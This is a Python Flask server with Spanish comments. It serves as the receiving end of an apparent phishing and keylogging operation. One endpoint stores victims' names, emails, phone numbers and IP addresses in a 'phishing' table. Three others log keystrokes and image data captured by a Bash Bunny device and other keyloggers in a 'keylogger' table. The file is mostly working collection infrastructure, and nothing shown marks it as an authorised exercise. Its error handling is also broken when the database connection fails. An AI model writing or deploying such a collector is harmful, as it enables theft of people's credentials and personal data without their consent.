from flask import Flask, request, jsonify
from flask_talisman import Talisman

import logging
from datetime import datetime
import pytz
import mysql.connector
import os

app = Flask(__name__)

# 3. Cabeceras seguras con Talisman
Talisman(app)

# 5. Logging de errores
logging.basicConfig(level=logging.ERROR)

# 1. Variables de entorno para la base de datos
# 7. Reutilización del código de conexión

db_config = {
    "host": os.getenv("DB_HOST"),
    "user": os.getenv("DB_USER"),
    "password": os.getenv("DB_PASSWORD"),
    "database": os.getenv("DB_NAME")
}

def conectar_mysql():
    return mysql.connector.connect(**db_config)

@app.route('/guardar-formulario', methods=['POST'])
def guardar_formulario():
    data = request.json
    if not data:
        return jsonify({"error": "Solicitud vacía"}), 400

    nombre_apellidos = data.get("nombre_apellidos")
    email = data.get("email")
    telefono = data.get("telefono")

    if not all([nombre_apellidos, email, telefono]):
        return jsonify({"error": "Faltan campos requeridos"}), 400

    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr
    zona = pytz.timezone('Europe/Madrid')
    fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')

    try:
        conexion = conectar_mysql()
        cursor = conexion.cursor()
        query = "INSERT INTO phishing (fecha, ip, nombre_apellidos, email, telefono) VALUES (%s, %s, %s, %s, %s)"
        cursor.execute(query, (fecha, ip_cliente, nombre_apellidos, email, telefono))
        conexion.commit()
        return jsonify({"mensaje": "Formulario guardado correctamente"})
    except mysql.connector.Error as error:
        logging.error(f"DB Error: {error}")
        return jsonify({"error": "Error interno"}), 500
    finally:
        if cursor:
            cursor.close()
        if conexion:
            conexion.close()

@app.route('/guardar-bashbunny', methods=['POST'])
def guardar_bashbunny():
    data = request.json
    if not data:
        return jsonify({"error": "Cuerpo de la solicitud vacío"}), 400

    datos = data.get("datos")
    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr

    if not datos:
        return jsonify({"error": "Datos inválidos"}), 400

    try:
        conexion = conectar_mysql()
        cursor = conexion.cursor()
        zona = pytz.timezone('Europe/Madrid')
        fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')
        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'B')"
        cursor.execute(query, (fecha, ip_cliente, datos))
        conexion.commit()
        return jsonify({"mensaje": "Datos guardados en Keylogger (Bash Bunny)"})
    except mysql.connector.Error as error:
        logging.error(f"DB Error: {error}")
        return jsonify({"error": "Error interno"}), 500
    finally:
        if cursor:
            cursor.close()
        if conexion:
            conexion.close()

@app.route('/guardar-real', methods=['POST'])
def guardar_real():
    data = request.json
    if not data:
        return jsonify({"error": "Cuerpo de la solicitud vacío"}), 400

    datosreal = data.get("datosreal")
    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr

    if not datosreal:
        return jsonify({"error": "Datos inválidos"}), 400

    try:
        conexion = conectar_mysql()
        cursor = conexion.cursor()
        zona = pytz.timezone('Europe/Madrid')
        fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')
        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'R')"
        cursor.execute(query, (fecha, ip_cliente, datosreal))
        conexion.commit()
        return jsonify({"mensaje": "Datos guardados en Keylogger (Ilimitado)"})
    except mysql.connector.Error as error:
        logging.error(f"DB Error: {error}")
        return jsonify({"error": "Error interno"}), 500
    finally:
        if cursor:
            cursor.close()
        if conexion:
            conexion.close()

@app.route('/guardar-img', methods=['POST'])
def guardar_img():
    data = request.json
    if not data:
        return jsonify({"error": "Cuerpo de la solicitud vacío"}), 400

    datosImg = data.get("datosImg")
    ip_cliente = request.headers.get("X-Forwarded-For") or request.remote_addr

    if not datosImg:
        return jsonify({"error": "Datos inválidos"}), 400

    try:
        conexion = conectar_mysql()
        cursor = conexion.cursor()
        zona = pytz.timezone('Europe/Madrid')
        fecha = datetime.now(zona).strftime('%Y-%m-%d %H:%M:%S')
        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'I')"
        cursor.execute(query, (fecha, ip_cliente, datosImg))
        conexion.commit()
        return jsonify({"mensaje": "Datos guardados en Keylogger"})
    except mysql.connector.Error as error:
        logging.error(f"DB Error: {error}")
        return jsonify({"error": "Error interno"}), 500
    finally:
        if cursor:
            cursor.close()
        if conexion:
            conexion.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
